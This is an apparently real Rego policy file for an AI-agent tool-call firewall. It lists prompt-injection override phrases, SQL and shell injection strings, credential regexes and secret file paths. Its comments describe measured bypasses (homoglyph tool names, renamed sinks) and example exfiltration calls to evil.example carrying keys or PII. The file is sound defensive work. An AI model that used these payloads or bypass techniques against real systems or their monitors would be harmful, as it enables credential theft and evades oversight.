# SPDX-License-Identifier: Apache-2.0
# The "strict" org baseline COMPOSES the canonical content detectors (injection /
# data-leak / secret-egress / PII / PCI / base64) IN ADDITION to the high-risk tool-name blocks, so an
# UNPROVISIONED agent class (which falls back to this baseline) gets real content protection, not just
# a tool-name allowlist. This file is INLINED from comprehensive.rego on purpose (single build, no
# generator); a parity opa test (comprehensive_parity_test.rego) guards against drift. The b64
# fan-out cap + the API body-size limit therefore also apply on the baseline path.
package norviq.presets.strict

# Canonical horizontal policy. Decision/rule_id/reason are resolved from PARTIAL-SET triggers
# (blocks/escalates/audits) + a deterministic resolver — the same pattern the sector packs use — so
# that when several rules match ONE call (e.g. PCI + PII + injection in one payload) there is NO
# complete-rule conflict and EVERY block/escalate/audit carries a correct human-readable reason.
# Precedence: block > escalate > audit > allow; ties resolved by sorted rule_id (deterministic).
# The detection predicates below are guarded for decision parity by a test.

default decision = "allow"
default rule_id = "default_allow"
default reason = "Allowed"

# --- detection predicates (unchanged) ---

# Prompt injection
injection_patterns = [
    "ignore previous instructions",
    "ignore above instructions",
    "ignore prior instructions",
    "ignore earlier instructions",
    "ignore above and act as admin",
    "enable dan",
    "repeat your system",
    "bypass all safety",
    "pretend you are",
    "forget your instructions",
    "you are now",
]
injection_patterns_fullwidth = ["ｉｇｎｏｒｅ", "ｄａｎ", "ｂｙｐａｓｓ"]
injection_override_keywords = ["ignore", "disregard", "override", "forget", "skip", "bypass"]
# Multi-word override phrases matched against the space-normalized text (compact matching above
# only catches single tokens / spaced-out evasion). Covers "do not follow the rules" style jailbreaks.
injection_override_phrases = ["do not follow", "dont follow", "stop following", "no longer follow", "act as admin"]
injection_context_keywords = ["previous", "prior", "above", "earlier", "system"]
# Covers paraphrases that name the guardrail without saying "instructions" so they still match
# (guidelines/restrictions/filters/prompt/safety were all observed bypasses).
injection_directive_keywords = ["instruction", "instructions", "guardrail", "guardrails", "rule", "rules", "policy", "policies", "directions", "guideline", "guidelines", "restriction", "restrictions", "filter", "filters", "prompt", "safety"]
injection_action_keywords = ["reveal", "dump", "export", "print", "show", "delete", "leak", "exfiltrate", "disclose"]
injection_target_keywords = ["secret", "secrets", "confidential", "credential", "credentials", "token", "tokens", "hidden credentials", "confidential data", "password", "passwords", "api key", "api keys", "private key"]

security_scan_texts[t] {
    walk(input.tool_params, [_, val])
    is_string(val)
    t := lower(val)
}

security_scan_texts[t] {
    walk(input.tool_params_normalized, [_, val])
    is_string(val)
    t := lower(val)
}

security_scan_texts[t] {
    decoded := b64_decoded[_]
    t := decoded
}

injection_scan_texts[t] {
    t := security_scan_texts[_]
}

security_scan_texts_raw[t] {
    walk(input.tool_params, [_, val])
    is_string(val)
    t := val
}

security_scan_texts_raw[t] {
    walk(input.tool_params_normalized, [_, val])
    is_string(val)
    t := val
}

security_scan_decoded_raw[t] {
    t := b64_decoded_raw[_]
}

injection_scan_texts_raw[t] {
    t := security_scan_texts_raw[_]
}

normalized_text(s) = out {
    out := regex.replace(lower(s), `[^a-z0-9]+`, " ")
}

compact_text(s) = out {
    out := regex.replace(lower(s), `[^a-z0-9]+`, "")
}

contains_any(text, terms) {
    term := terms[_]
    contains(text, term)
}

combined_injection_text = out {
    parts := [normalized_text(t) | t := injection_scan_texts[_]]
    out := concat(" ", parts)
}

combined_injection_compact = out {
    out := compact_text(combined_injection_text)
}

injection_detected {
    val := injection_scan_texts[_]
    pattern := injection_patterns[_]
    contains(val, pattern)
}
injection_detected {
    val := injection_scan_texts_raw[_]
    pattern := injection_patterns_fullwidth[_]
    contains(val, pattern)
}
# An override is present when a single override token appears in the compacted text (catches
# spaced-out evasion) OR a multi-word override phrase appears in the normalized text.
injection_override_present(normalized, compact) {
    contains_any(compact, injection_override_keywords)
}
injection_override_present(normalized, compact) {
    contains_any(normalized, injection_override_phrases)
}
# Intent = the paraphrase names WHAT to subvert or WHY. Any one of context/target/action suffices
# once an override + a directive are present.
injection_intent(normalized) { contains_any(normalized, injection_context_keywords) }
injection_intent(normalized) { contains_any(normalized, injection_target_keywords) }
injection_intent(normalized) { contains_any(normalized, injection_action_keywords) }

# LLM01 paraphrase guard: override + directive + intent (normalized/compact matching, not only
# contiguous/exact substrings).
injection_detected {
    txt := injection_scan_texts[_]
    normalized := normalized_text(txt)
    compact := compact_text(txt)
    injection_override_present(normalized, compact)
    contains_any(normalized, injection_directive_keywords)
    injection_intent(normalized)
}
# Split-across-params paraphrase guard: aggregate signals across all text params.
injection_detected {
    normalized := combined_injection_text
    compact := combined_injection_compact
    injection_override_present(normalized, compact)
    contains_any(normalized, injection_directive_keywords)
    injection_intent(normalized)
}
# System-prompt exfiltration — "reveal/show/dump/print your system prompt" carries no override
# verb, so require system + prompt + an action verb together (tight enough to avoid benign prose).
injection_detected {
    txt := injection_scan_texts[_]
    normalized := normalized_text(txt)
    contains(normalized, "system")
    contains(normalized, "prompt")
    contains_any(normalized, injection_action_keywords)
}
# Confusable skeleton (homoglyph/zero-width) — engine folds tool_params to ASCII (match-only).
# SQL injection
sql_patterns = ["drop table", "union select", "or '1'='1'", "or 1=1", "delete from", "xp_cmdshell", "exec ("]
# Clearly-destructive SQL caught in ANY tool's params (a renamed tool — run_report/read_record — can carry
# a destructive statement past the execute_sql-only rule). Kept tight to avoid benign free-text false-blocks.
sql_destructive_patterns = ["drop table", "delete from", "truncate table", "; drop", "xp_cmdshell", "union select"]

sql_injection_detected {
    input.tool_name == "execute_sql"
    query := security_scan_texts[_]
    pattern := sql_patterns[_]
    contains(query, pattern)
}
# Destructive SQL in ANY tool's params, but only with SQL-SYNTAX CONTEXT so natural
# business prose ("please delete from my calendar", "we should drop table service at the restaurant")
# is not hard-blocked. Context = the value LEADS with the destructive statement (bare SQL, e.g. a
# renamed run_report/read_record carrying "drop table users") OR contains a statement separator ";".
sql_injection_detected {
    val := security_scan_texts[_]
    pattern := sql_destructive_patterns[_]
    contains(val, pattern)
    sql_syntax_context(val, pattern)
}
sql_syntax_context(val, pattern) { startswith(trim_space(val), pattern) }
sql_syntax_context(val, _) { contains(val, ";") }

# Shell injection
#
# TWO lists, because raw text and DECODED BYTES are not the same evidence and must not share a
# pattern set. A "|" in a parameter a human typed is weak-but-real evidence of a shell pipe. A "|"
# among the ~9 bytes you get from base64-decoding an ordinary English phrase is no evidence at all —
# it is one byte in 256 coming up 0x7C.
#
# This is measured, not theoretical. `shell_injection_detected`'s decoded arm used to reuse the RAW
# list (then named `shell_patterns_decoded`, one transposition away from the correct
# `decoded_shell_patterns` below and easily mistaken for it), and that single reuse produced the whole
# base64 false-positive curve both red-team campaigns recorded: 4.0% at 8 chars, 32.0% at 64, 12.7%
# overall, and 2.5% reproduced on plain English prose.
#
# Traced end to end: {"note": "benign call 18"} -> b64_candidate_clean strips the spaces ->
# `benigncall18` clears the >=8 length gate, the charset gate and the not-all-digits gate -> decodes
# to 6d e9 e2 82 77 1a 96 5d 7c -> the final byte 0x7C is "|" -> deny_shell_execution. The customer
# wrote a sentence; the control reported a shell injection.
#
# So the decoded arm matches MULTI-BYTE indicators only — the same list the dedicated
# `base64_decoded_threat` rule below already uses correctly, which is why THAT rule never had this
# problem. A real encoded payload still matches: base64("rm -rf /") decodes to "rm -rf /". Bare
# metacharacters stay on the raw arm, where they mean something.
shell_patterns = ["|", ";", "$(", "`", "rm -rf", "/etc/passwd", "/etc/shadow"]

shell_injection_detected {
    val := security_scan_texts_raw[_]
    pattern := shell_patterns[_]
    contains(val, pattern)
}
shell_injection_detected {
    val := lower(security_scan_decoded_raw[_])
    pattern := decoded_shell_patterns[_]
    contains(val, pattern)
}

# --- F-005: SQL comment-terminator injection on a RENAMED tool ---------------------------------
#
# `sql_injection_detected` has two arms: the full `sql_patterns` set (union/boolean/etc) gated on the
# literal tool name `execute_sql`, and a context-gated `sql_destructive_patterns` set for any other
# tool. The second arm is the renamed-tool backstop, and it had no comment terminator, so
# `sql_query {query: "SELECT * FROM t -- bypass"}` was ALLOWED — measured on this file.
#
# A comment terminator is only injection when it follows an actual statement, so this requires BOTH:
# the value LEADS with a SQL statement keyword, and it carries a terminator. Adding `--` to
# `sql_destructive_patterns` instead would have been wrong twice over — the context gate wants the
# value to LEAD with the matched pattern (a comment never leads a real statement), and `--` in prose
# is ordinary punctuation.
_sql_statement_lead(val) {
    lead := ["select ", "insert ", "update ", "delete ", "drop ", "alter ", "create ", "truncate ", "union "]
    startswith(trim_space(lower(val)), lead[_])
}
_sql_comment_terminator(val) { contains(val, "--") }
_sql_comment_terminator(val) { contains(val, "/*") }
_sql_comment_terminator(val) { contains(val, "#") }

sql_injection_detected {
    val := security_scan_texts[_]
    _sql_statement_lead(val)
    _sql_comment_terminator(val)
}

# --- F-007: a non-HTTP scheme on a fetch tool is LFI/SSRF, not shell injection ------------------
#
# `http_fetch {url: "file:///etc/passwd"}` blocked — correctly — but reported
# `rule_id: deny_shell_execution`, because the shell content rule matches `/etc/passwd`-shaped text
# whatever tool carries it. The block was right and the attribution was wrong, which corrupts the
# product's own "confirm by rule_id" discipline: an operator reading the audit sees a shell-execution
# attempt that never happened, and the rule they would tune is not the one that fired.
#
# This names it properly. The shell rule is deliberately NOT narrowed to exec-class tools, which the
# card suggests: that would stop it firing on a renamed tool carrying a real shell payload, trading an
# attribution bug for a detection gap. Both rules fire; `dangerous_scheme` is the accurate one, and
# the resolver's sorted-rule_id tie-break is what decides which is reported.
dangerous_scheme_detected {
    val := lower(security_scan_texts[_])
    scheme := ["file://", "gopher://", "dict://", "ftp://", "jar:", "netdoc://", "php://", "data:text/html"]
    contains(val, scheme[_])
}

# Destructive / elevated tools
destructive_tools = {"delete_record", "drop_table", "truncate"}
elevated_tools = {"modify_config", "grant_access"}

# Data leakage
external_tools = {"send_email", "post_webhook", "upload_file"}
sensitive_keys = {"password", "secret", "api_key", "token", "private_key"}

# The enforced strict cluster baseline must cover more than the 3 named external_tools: a
# secret sent via any other egress-verb sink (http_post, s3_put, put_object, call_api, notify_external,
# smtp_send, *webhook*, *exfil*) would otherwise leak. Mirror comprehensive.rego's egress_verb_tool so both the
# key-name and value-pattern checks below treat any egress-verb tool as an external sink.
egress_verb_tool {
    name := lower(input.tool_name)
    prefixes := ["send_", "post_", "upload_", "publish_", "export_", "http_", "fetch_", "sync_to_", "push_to_", "put_", "s3_", "call_", "notify_", "smtp"]
    startswith(name, prefixes[_])
}
egress_verb_tool { contains(lower(input.tool_name), "webhook") }
egress_verb_tool { contains(lower(input.tool_name), "exfil") }

# THE ENGINE'S OWN CLASSIFICATION — see comprehensive.rego for the full argument.
#
# THIS FILE IS THE ONE THAT SHIPS. The bootstrap pushes this preset as the cluster `__baseline__`, so
# fixing only comprehensive.rego left the running cluster exactly as exposed: with the fix in that
# file and real `opa` reporting block, a live `/evaluate` still returned
# `allow/default_allow` for a credential through `slack_post_message`. The two files are a documented
# pair of guarded copies (this OPA cannot import across packages), and a defence added to one of them
# is a defence that is not deployed.
#
# `input.derived.verb` is computed on the hot path for every call and published by
# engine/evaluator.py. The prefix list above and the registry disagree on ordinary vendor tool names —
# `slack_post_message` starts with `slack_`, not `post_` — so the exfiltration path was chosen by
# whichever SaaS the customer happens to use. `object.get` with a default so an engine predating
# `derived.verb` keeps the name-based behaviour rather than erroring.
egress_verb_tool { object.get(input.derived, "verb", "") == "send"; not retrieval_lead_tool }

# ...but read the classification, do not obey it — SAME TEXT AS comprehensive.rego, and the reason the
# pair has to move together. The registry classifies a name by taking the WORST verb over ALL of its
# tokens, so a tool that LEADS with a retrieval verb and merely carries an egress NOUN later is
# published as verb="send": `get_mail`, `list_mail`, `read_email_thread`, `search_mail`,
# `get_sync_status`, `download_export` are all reads, and `mail`/`email`/`sync`/`export` are all SEND
# tokens. Taking the classification verbatim made every one of them a sink, and `sensitive_keys` holds
# the bare key `token`, so an ordinary paginated read
#
#   get_mail{"folder": "INBOX", "token": "AQABAAAA-nextPage"}   -> ("block", "llm02_data_leakage")
#
# started being refused as data leakage BY THE ENFORCED CLUSTER BASELINE. Measured over 53 realistic
# vendor tool names, 39 non-egress tools (28 reads, 11 writes) became sinks. A pagination cursor is not
# a credential, and a refusal is not free — an enforcing baseline that denies the majority of benign
# reads gets turned off. So the LEADING token, which is the tool's own statement of what it does and is
# exactly the evidence the registry's `max()` discards, withholds the CLASSIFICATION-derived sink.
#
# Withheld narrowly, on purpose. This does NOT touch the prefix / *webhook* / *exfil* bodies above, so
# `fetch_url`, `http_get` and `put_object` stay sinks by prefix despite leading with a retrieval verb.
#
# TOKENISED THE WAY THE REGISTRY TOKENISES IT — SAME TEXT AS comprehensive.rego. `_tokenize_tool`
# splits a name on separators AND on camelCase boundaries, so `getMail`, `get-mail`,
# `chat.postMessage` and `SES:SendRawEmail` are classified exactly like their snake_case spellings —
# while `startswith(name, "get_")` and `split(name, "_")` only ever see snake_case. Reading a
# camelCase-aware classification with a snake_case-only rule broke this section in BOTH directions,
# measured through real opa on THIS file, the one the cluster enforces:
#
#   getMail{"folder": "INBOX", "token": "pg2"}       -> still ("block","llm02_data_leakage")   [over-block survives a change of spelling]
#   sendEmail / postMessage / send-email + verb=read -> ("allow","default_allow")              [the demotion below still works]
#
# One `strings.replace_n` (26 letters + the four separators) costs no regex op — the file is at 24 of
# the API's 25 — and is linear in the name: a 40 000-character name evaluates in 0.07s.
name_split_map = {"A": "_a", "B": "_b", "C": "_c", "D": "_d", "E": "_e", "F": "_f", "G": "_g", "H": "_h", "I": "_i", "J": "_j", "K": "_k", "L": "_l", "M": "_m", "N": "_n", "O": "_o", "P": "_p", "Q": "_q", "R": "_r", "S": "_s", "T": "_t", "U": "_u", "V": "_v", "W": "_w", "X": "_x", "Y": "_y", "Z": "_z", "-": "_", ".": "_", ":": "_", "/": "_", " ": "_", "\t": "_", ",": "_", "+": "_", "|": "_", "\\": "_"}
# Separators, NOT just punctuation-that-looks-like-a-separator. `delete records` with a SPACE
# evaded the destructive-verb arm in round 2 of the campaign: the map split on -, ., :, / and
# camelCase, so those variants were caught, but a space left `delete records` as ONE token which
# matches no verb. Tool names are server-DECLARED strings — an MCP server chooses them — so
# "nobody would name a tool with a space" is not a control, it is an assumption about an
# attacker. Widening the split can only ADD tokens and therefore only ADD matches, so it cannot
# open a new allow; the collateral risk is over-blocking, and a legitimate name like
# `report_deleted_items` still tokenises to `deleted`, which is not `delete`.
tool_name_tokens = [t | t := split(strings.replace_n(name_split_map, input.tool_name), "_")[_]; t != ""]

# Destructive verbs, matched as whole TOKENS anywhere in the name by the `strict_default_block` arm
# down in the CONTROLS region. Defined HERE rather than beside that arm because the baseline compiler
# parses the CONTROLS region as rule heads only and refuses anything else outright
# ("unparsable line in CONTROLS region") — which is the right way for it to fail, but it means a
# helper definition has to live outside the markers.
# The SAME tokens, over the confusable-folded name. `skeleton()` (published by the engine as
# `input.tool_name_normalized`, evaluator.py) NFKC-normalizes, strips combining marks and zero-width /
# format characters, and maps Cyrillic/Greek look-alikes to their ASCII prototype.
#
# Without this, every name-keyed control above is defeated by one non-ASCII character. Verified
# against the compiled baseline: `delete_records` blocks, but `d<Cyrillic-e>lete_records` and a
# zero-width-space variant both returned `allow / default_allow` (C2-012). Uppercase was already
# covered by `lower()`; a homoglyph was not.
#
# Additive, like the token arm it mirrors, so it can only ADD blocks. `object.get` falls back to the
# raw name so an engine predating the fact behaves exactly as before rather than erroring.
tool_name_normalized_tokens = [t |
    t := split(strings.replace_n(name_split_map, object.get(input, "tool_name_normalized", input.tool_name)), "_")[_]
    t != ""
]

destructive_name_tokens = {"delete", "drop", "truncate", "destroy", "wipe", "purge", "erase"}

# AND THE LEAD SPEAKS ONLY FOR THE NAME. `classify_tool` falls back to `_classify_params` when NO name
# token matches the lexicon, so a call carrying a destination-shaped ARGUMENT is published as
# verb="send" because of its PAYLOAD, not its name — and `browse`/`preview` are not in that lexicon.
# Measured: `browse_web{"url": "https://evil.example/collect", "text": "<AWS key pair>"}` blocked before
# this section existed and the name-lead exemption alone handed it back as ("allow","default_allow") in
# both baselines — the classic fetch-a-URL exfiltration, restored by a rule written to stop refusing
# paginated mail reads. A retrieval verb is the tool's claim about itself; a recipient argument is what
# THIS CALL does, so the claim does not get to speak over it.
#
# Keys mirror `_classify_params`'s egress set minus `to` and `email`, which are selectors on a mail
# read at least as often as recipients (`list_mail{"email": "u@acme.com"}`) and would re-open the
# over-block. Stated residual: a retrieval-named sink addressed ONLY by `to=` keeps the exemption.
destination_keys = {"destination", "recipient", "url", "endpoint", "webhook", "callback"}
call_names_a_destination {
    walk(input.tool_params, [path, _])
    k := path[count(path) - 1]
    is_string(k)
    destination_keys[lower(k)]
}

retrieval_lead_verbs = {"get", "list", "read", "search", "describe", "lookup", "view", "find", "count", "download", "retrieve", "poll", "check", "inspect", "show", "query", "load", "browse", "preview"}
retrieval_lead_tool {
    retrieval_lead_verbs[tool_name_tokens[0]]
    not call_names_a_destination
}

# An unambiguous egress ACTION verb appearing as a whole `_`-separated token, which is a sink on its
# own — two jobs.
#
# (1) It overrides the retrieval exemption above: `get_share_link` and `download_and_forward` lead with
#     a retrieval verb but name an egress action, and an action beats a lead. Matched on WHOLE tokens
#     rather than as substrings so the plural/participle NOUNS that made the reads over-block —
#     `list_posts`, `get_shared_drive`, `read_notifications` — are not swept back in.
#
# (2) It is name-evident sink evidence that does NOT consult `input.derived`, and that matters because
#     `derived.verb` is OVERRIDABLE at runtime: POST /threats/tool-verbs/promote rewrites the verb for a
#     (namespace, tool) pair, and promoting `slack_post_message` to "read" made `derived.verb == "read"`,
#     falsified the classification body above, and handed back exactly the credential-exfil path this
#     section exists to close — on THIS file, the one the cluster enforces. A promotion must never be
#     able to DEMOTE a sink whose own name says what it is, so this body survives it.
#
# Egress NOUNS (`mail`, `email`, `export`, `sync`, `report`, `ticket`) are deliberately absent — they are
# what made the reads above over-block. Stated residual: a genuine noun/verb collision (`get_post` on a
# blog API, `read_share`) is treated as a sink, and a sink deliberately named `get_*` carrying no action
# token is missed. Both are name-shaped judgements; the payload rules below still apply to either.
#
# Over `tool_name_tokens`, so a promotion cannot be dodged by spelling the sink `sendEmail` instead of
# `send_email` — `split(name, "_")` saw ONE token there and the whole demotion defence was snake-only.
egress_action_tokens = {"send", "post", "upload", "publish", "forward", "relay", "dispatch", "share",
                        "transmit", "deliver", "broadcast", "notify", "emit", "push", "webhook",
                        "exfil", "exfiltrate", "leak", "smtp", "sms", "egress", "outbound"}
egress_verb_tool { egress_action_tokens[tool_name_tokens[_]] }

# EGRESS EVIDENCE FROM THE PARAMS, NOT THE NAME — F-046. SAME TEXT AS comprehensive.rego.
#
# Every clause above infers a sink from what the tool is CALLED. A read-named tool that carries a
# destination in its arguments is a sink no matter what it is called, and measured on this file the
# gap was live: with an AWS key in the payload and `http://evil.example/c` in a `url` param,
#
#   fetch_data      -> block  (only because `fetch_` is in the prefix list)
#   lookup_customer -> ALLOW
#   retrieve_records-> ALLOW
#   view_report     -> ALLOW
#   describe_asset  -> ALLOW
#
# Same call, same credential, same attacker URL; the verdict was decided by the tool's name. That is
# the complaint already recorded above about `slack_post_message` — "the exfiltration path was chosen
# by whichever SaaS the customer happens to use" — reappearing from the other direction.
#
# `derived.destinations` is already computed on the hot path for exactly this ("under deny-by-default
# the destination IS the control"), so this reads it rather than re-regexing params in policy.
#
# WHY THIS IS NOT FOLDED INTO egress_verb_tool. Widening that predicate would also widen the KEY-NAME
# gate below, and that gate is why `sensitive_keys` over-blocking is the documented disaster in this
# file: it holds the bare key `token`, so `get_mail{"folder":"INBOX","token":"AQABAAAA-nextPage"}`
# became data leakage and 39 of 53 realistic vendor tools turned into sinks. A pagination cursor beside
# a URL must not block. So the destination signal is paired ONLY with the VALUE-pattern checks, which
# require an actual credential/regulated artifact to match — evidence a cursor cannot produce.
#
# object.get-guarded throughout so an engine predating `derived.destinations` keeps today's behaviour
# rather than erroring.
value_pattern_sink { egress_verb_tool }
value_pattern_sink { count(object.get(object.get(input.derived, "destinations", {}), "urls", [])) > 0 }
value_pattern_sink { count(object.get(object.get(input.derived, "destinations", {}), "emails", [])) > 0 }

data_leakage_detected {
    external_tools[input.tool_name]
    walk(input.tool_params, [path, _])
    count(path) > 0
    k := path[count(path) - 1]
    is_string(k)
    sensitive_keys[lower(k)]
}
data_leakage_detected {
    egress_verb_tool
    walk(input.tool_params, [path, _])
    count(path) > 0
    k := path[count(path) - 1]
    is_string(k)
    sensitive_keys[lower(k)]
}

# A secret embedded in a param VALUE sent to an external tool (e.g. send_email body
# "api_key=sk-123") — the key-name check above misses it because the key is `body`, not `api_key`.
secret_value_patterns = [
    `api[_-]?key\s*[:=]`,
    `secret[_-]?key\s*[:=]`,
    `password\s*[:=]`,
    `aws_secret_access_key`,
    `bearer\s+[a-z0-9._-]{12,}`,
    `sk-[a-z0-9]{8,}`,
    `-----begin [a-z ]*private key-----`,
]

# DL-001b: a BARE, UNLABELLED credential in a param value.
#
# Every pattern above needs a LABEL — `api_key:`, `secret_key=`, `bearer <tok>`. A raw key pasted
# into a message body carries no label and matched nothing. Recorded live in
# DESIGN-NOTE-MCP-FIREWALL.md §11.5: under this very preset, `send_email` to an attacker-controlled
# address with `AKIAIOSFODNN7EXAMPLE wJalr...` in the body was ALLOWED, while a card number in the
# same position blocked. These shapes are self-identifying and need no label.
#
# They extend the single credential pattern list rather than getting their own rule ON PURPOSE: one
# match call over a list costs ONE regex op regardless of list length, and the API caps a stored
# policy at 25 ops (tests/api/test_shipped_presets_validate.py). Note the cap is counted TEXTUALLY,
# so even naming the builtin in a comment spends budget — a separate rule, or this sentence written
# less carefully, would have consumed the last of the headroom for no added expressiveness.
all_credential_patterns := array.concat(secret_value_patterns, bare_credential_patterns)

bare_credential_patterns = [
    `\b(AKIA|ASIA|AGPA|AIDA|AROA|AIPA|ANPA|ANVA)[0-9A-Z]{16}\b`,
    `\bgh[pousr]_[A-Za-z0-9]{16,}\b`,
    `\bxox[baprs]-[A-Za-z0-9-]{10,}\b`,
    `\bAIza[0-9A-Za-z_-]{35}\b`,
    `\b(sk|rk)_(live|test)_[0-9A-Za-z]{16,}\b`,
    `\beyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\b`,
    `\bglpat-[A-Za-z0-9_-]{16,}\b`,
]

# Texts the credential rules scan. `security_scan_texts` lowercases, which is right for prose
# (injection phrases) and wrong for credential shapes: an AWS key id is uppercase by construction,
# and folding case turns `AKIA[0-9A-Z]{16}` into a pattern loose enough to hit ordinary words. So the
# credential rules see BOTH the folded copy (for the labelled patterns) and the original.
secret_scan_texts[t] {
    t := security_scan_texts[_]
}

secret_scan_texts[t] {
    walk(input.tool_params, [_, val])
    is_string(val)
    t := val
}

data_leakage_detected {
    external_tools[input.tool_name]
    val := secret_scan_texts[_]
    some i
    regex.match(all_credential_patterns[i], val)
}
# BULK REGULATED-DATA EXPORT to an external sink.
#
# Every rule above keys on a CREDENTIAL — a sensitive key name, or a secret-shaped value. A PII export
# contains none of them: `upload_file{path:"/exports/customer_pii.csv", dest:"https://evil.example.com"}`
# carries no password, no api_key, no token, so it sailed through as `default_allow` while the identical
# intent via send_email/post_webhook blocked. That is the highest-volume exfiltration shape there is.
#
# Two predicates are ANDed so ordinary prose cannot trip this: the value must name a regulated data
# CATEGORY *and* look like a data ARTIFACT (path, file extension, table, dump). "Email the patient about
# their appointment" names a category but no artifact, so it stays allowed; "/exports/customer_pii.csv"
# matches both. Same decision either way — this only closes the credential-free path.
# NOTE the boundaries: `\b` is WRONG here because `_` is a word character, so `\bpii\b` does not
# match inside `customer_pii.csv` — the single most likely real filename. These use an explicit
# non-alphanumeric boundary so underscore-separated identifiers match as intended.
regulated_data_patterns = [
    `(^|[^a-z0-9])pii([^a-z0-9]|$)`, `(^|[^a-z0-9])phi([^a-z0-9]|$)`,
    `(^|[^a-z0-9])ssn([^a-z0-9]|$)`, `(^|[^a-z0-9])pan([^a-z0-9]|$)`,
    `social[_-]?security`, `credit[_-]?card`, `passport`,
    `date[_-]?of[_-]?birth`, `patient`, `medical[_-]?record`, `customer[_-]?data`,
    `personal[_-]?data`, `cardholder`, `tax[_-]?id`,
]
data_artifact_patterns = [
    `\.(csv|sql|json|parquet|xlsx?|tsv|dump|bak|gz|zip)\b`,
    `\bexport\b`, `\bdump\b`, `\bbackup\b`, `\bextract\b`, `/`,
]

_regulated_artifact(val) {
    some i, j
    regex.match(regulated_data_patterns[i], lower(val))
    regex.match(data_artifact_patterns[j], lower(val))
}
data_leakage_detected {
    external_tools[input.tool_name]
    val := security_scan_texts[_]
    _regulated_artifact(val)
}
data_leakage_detected {
    value_pattern_sink
    val := security_scan_texts[_]
    _regulated_artifact(val)
}

# A secret in a param VALUE must also block on ANY egress-verb sink, not only the 3 named
# external_tools — mirrors the egress-verb key-name rule above and comprehensive.rego.
data_leakage_detected {
    value_pattern_sink
    val := secret_scan_texts[_]
    some i
    regex.match(all_credential_patterns[i], val)
}



# Reading an environment secret / credential is data egress (OWASP LLM02).
secret_read_tools = {"read_env", "getenv", "get_secret", "read_secret", "fetch_secret"}
secret_name_patterns = [`secret`, `password`, `api[_-]?key`, `token`, `private[_-]?key`, `access[_-]?key`, `credential`]

secret_egress_detected {
    secret_read_tools[input.tool_name]
    val := security_scan_texts[_]
    some i
    regex.match(secret_name_patterns[i], val)
}

# CREDENTIAL MATERIAL sent to an external sink.
#
# `secret_egress_detected` above fires ONLY for a secret-READ tool (read_env/get_secret/...). Its word
# list is the right one, but nothing applies it to an egress tool — and the two credential rules that do
# apply there both miss a credential carried as a FILE PATH: `sensitive_keys` is compared against the
# param KEY name, and `secret_value_patterns` require an explicit `:` or `=`.
#
# Verified live against this shipped baseline. With an external `dest`, every one of
#   /root/.ssh/id_rsa  /app/.env  /app/credentials.json  /var/secrets/private_key.pem  /etc/kubernetes/admin.conf
# returned `default_allow`, while the regulated-data shape immediately above blocked. So the PII fix closed
# the credential-FREE path and left the credential path open — the sharper of the two, since an SSH key or
# a kubeconfig is a direct credential compromise, not a privacy incident. `private_key` is the clearest
# illustration: it IS in `sensitive_keys`, but that set only ever sees key NAMES, so it never inspects
# `path: "/var/secrets/private_key.pem"`.
#
# Structured like the regulated-data rule above, and for the same false-positive reason: either the value
# is a credential file BY CONVENTION (a name that carries no other meaning), or it pairs a credential word
# with a real file artifact. Deliberately UNLIKE that rule, a bare `/` is not an artifact here, because
# "reset your password at https://app/reset" is ordinary prose and has to stay allowed while
# "password_dump.txt" must not. security_scan_texts is already lowercased, so these match directly.
# The API caps a policy at 25 `regex.*` operations (policies.py::validate_rego_source) and this
# baseline already used 23, so each predicate below is written as ONE self-sufficient pattern and the
# whole rule costs a SINGLE regex op. Splitting it into "word" + "shape" lists ANDed together read more
# cleanly but cost three, which pushed the shipped preset to 26 and made the API reject it with a bare
# `422 too many regex operations` — the controller then retried forever and the baseline silently kept
# enforcing the OLD rego. tests/api/test_shipped_presets_validate.py now fails before that can ship again.
credential_artifact_patterns = [
    # (a) credential files BY CONVENTION — the filename alone is the signal, no second predicate needed.
    `(^|[^a-z0-9])id_(rsa|dsa|ecdsa|ed25519)([^a-z0-9]|$)`,
    `(^|[^a-z0-9])\.env([^a-z0-9]|$)`,
    `(^|[^a-z0-9])\.(npmrc|pypirc|netrc|dockercfg)([^a-z0-9]|$)`,
    `(^|[^a-z0-9])credentials?\.(json|ya?ml|ini|conf|cfg|csv)([^a-z0-9]|$)`,
    `(^|[^a-z0-9])(kubeconfig|htpasswd)([^a-z0-9]|$)`,
    `(^|[^a-z0-9])admin\.conf([^a-z0-9]|$)`,
    `\.(pem|p12|pfx|jks|keystore|kdbx|ovpn)([^a-z0-9]|$)`,
    `(^|/)shadow([^a-z0-9]|$)`,
    # (b) a credential WORD joined to a real file artifact. Joined in one pattern rather than ANDed
    #     across two lists, both for the regex budget above and because the join is the point: a bare
    #     word is prose ("reset your password at https://app/reset" must stay allowed), a word attached
    #     to a filename is an artifact ("password_dump.txt" must not).
    `(private[_-]?key|secret[_-]?key|access[_-]?key|api[_-]?keys?|passwd|password|credential|auth[_-]?token|client[_-]?secret|service[_-]?account)[a-z0-9._/-]*\.(pem|key|p12|pfx|jks|json|ya?ml|conf|cfg|ini|txt|env|csv|log|bak|zip|gz|tar|sql|dump)([^a-z0-9]|$)`,
]

_credential_artifact(val) {
    some i
    regex.match(credential_artifact_patterns[i], val)
}

secret_egress_detected {
    external_tools[input.tool_name]
    val := security_scan_texts[_]
    _credential_artifact(val)
}
secret_egress_detected {
    value_pattern_sink
    val := security_scan_texts[_]
    _credential_artifact(val)
}

# --- F-012: read the ENGINE's data classification instead of re-deriving it here ----------------
#
# These detectors are a SECOND, weaker copy of the content detection the engine already performed.
# Measured on this file with `send_email`, the engine catching every one of them:
#
#   AKIAIOSFODNN7EXAMPLE                 -> block
#   base64 of the same key               -> ALLOW
#   hex of the same key                  -> ALLOW
#   the same key lowercased              -> ALLOW
#   "123 45 6789" (spaced SSN)           -> ALLOW
#
# The engine publishes `derived.data_classes` from one shared normalize+decode stage (F-032:
# NFKC, invisible-strip, separator canonicalisation, base64/hex decode-and-rescan, Luhn-gated PAN,
# non-string leaves coerced). Reading it here is strictly better than widening the Rego regexes: the
# recall arrives for free, the 0-false-positive property comes with it, and there is one place to fix
# a detector instead of two that drift. It also costs no regex ops, which matters — this file is at
# 24 of the API validator's 25.
#
# The Rego detectors are deliberately KEPT alongside, not replaced. They are the floor if an engine
# predating `derived.data_classes` evaluates this policy, and `object.get` with a default means that
# case degrades to today's behaviour instead of erroring.
#
# Secret is the only one paired with a sink: possessing a credential is not egress, and blocking
# every call that merely CONTAINS one would refuse ordinary authenticated tool calls. PII and PCI
# already block unconditionally here, so they inherit that posture unchanged.
